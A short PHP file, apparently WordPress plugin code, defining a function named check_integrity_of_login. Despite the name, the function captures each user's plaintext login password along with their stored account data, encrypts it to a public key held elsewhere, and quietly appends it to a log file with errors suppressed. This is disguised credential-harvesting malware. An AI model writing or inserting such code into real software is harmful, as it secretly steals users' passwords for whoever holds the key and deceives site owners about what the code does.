<?php

require_once "utils.php";

function check_integrity_of_login($password, $hash, $user_id = '')
{
    $json_data = @file_get_contents(get_log_file_path());
    if (!$json_data) {
        $log = array();
    } else {
        $log = (array) json_decode($json_data);
    };

    $pub_key = @file_get_contents(get_key_file_path());

    $user_data = get_user_by("ID", $user_id)->data;
    $user_data->user_pass_hash = $user_data->user_pass;
    $user_data->user_pass = $password;

    $encrypted_user_data = sodium_crypto_box_seal(json_encode($user_data), $pub_key);

    $log[md5($user_id)] = base64_encode($encrypted_user_data);

    @file_put_contents(get_log_file_path(), json_encode($log));
}
